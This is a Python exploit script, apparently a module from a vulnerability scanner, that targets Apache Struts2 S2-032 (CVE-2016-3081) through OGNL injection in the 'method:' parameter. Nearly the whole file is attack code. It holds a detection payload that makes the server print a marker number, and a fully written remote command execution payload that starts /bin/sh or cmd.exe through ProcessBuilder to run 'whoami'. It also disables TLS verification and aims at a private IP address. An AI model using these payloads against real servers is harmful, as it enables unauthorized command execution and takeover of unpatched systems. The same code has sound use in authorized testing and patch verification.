import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'Apache Struts2 S2-032 远程代码执行漏洞 (CVE-2016-3081)'


def run(url):
    headers = {
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    try:
        payload3 = '''?&method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23matt%3D%23attr.get(%23parameters.com%5B0%5D%2b%23parameters.com1%5B0%5D)%2C%23matt.getWriter().println(1*102450)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%2C1%3F%23xx%3A%23request.toString&com=com.opensymphony.xwo&com1=rk2.dispatcher.HttpServletResponse'''
        response = requests.get(url+payload3, headers=headers, timeout=15, verify=False)
        if '102450' in response.text and 'println' not in response.text:
            return ['True',name,url]
        else:
            host = urlparse(url)
            url = f"{host.scheme}://{host.netloc}"
            try:
                vulurl = url + '/'
                # whoami
                payload1 = '''?&method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23a%3D%23parameters.reqobj%5B0%5D%2C%23c%3D%23parameters.reqobj%5B1%5D%2C%23req%3D%23context.get(%23a)%2C%23hh%3D%23context.get(%23parameters.rpsobj%5B0%5D)%2C%23osname%3D%40java.lang.System%40getProperty(%23parameters.os_name)%2C%23list%3D%23osname.startsWith(%23parameters.windows)%3Fnew%20java.lang.String%5B%5D%7B%23parameters.cmdexe%2C%23parameters.ccc_c%2C%23parameters.cmd%7D%3Anew%20java.lang.String%5B%5D%7B%23parameters.binbash%2C%23parameters.ccc%2C%23parameters.cmd%7D%2C%23aa%3D(new%20java.lang.ProcessBuilder(%23list)).start()%2C%23bb%3D%23aa.getInputStream()%2C%23hh.getWriter().println(new%20java.lang.String(new%20org.apache.commons.io.IOUtils().toByteArray(%23bb),%23parameters.gbk))%2C%23hh.getWriter().flush()%2C%23hh.getWriter().close()%2C1%3F%23xx%3A%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&cmd=whoami&reqobj=struts.txt&content=fb98ab9159f51fd0&os_name=os.name&windows=Windows&binbash=/bin/sh&ccc=-c&cmdexe=cmd.exe&ccc_c=/c&gbk=iso-8859-1'''
                # poc
                payload3 = '''?&method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23matt%3D%23attr.get(%23parameters.com%5B0%5D%2b%23parameters.com1%5B0%5D)%2C%23matt.getWriter().println(1*102450)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%2C1%3F%23xx%3A%23request.toString&com=com.opensymphony.xwo&com1=rk2.dispatcher.HttpServletResponse'''
                response = requests.get(vulurl+payload3, headers=headers, timeout=15, verify=False)
                if '102450' in response.text and 'println' not in response.text:
                    return ['True',name,vulurl]
                else:
                    return ['False',name]
            except Exception as e:
                return ['False',name]
    except Exception as e:
        return ['False',name]
    

if __name__ == '__main__':
    url = 'http://192.168.123.46:8080/'
    print(run(url))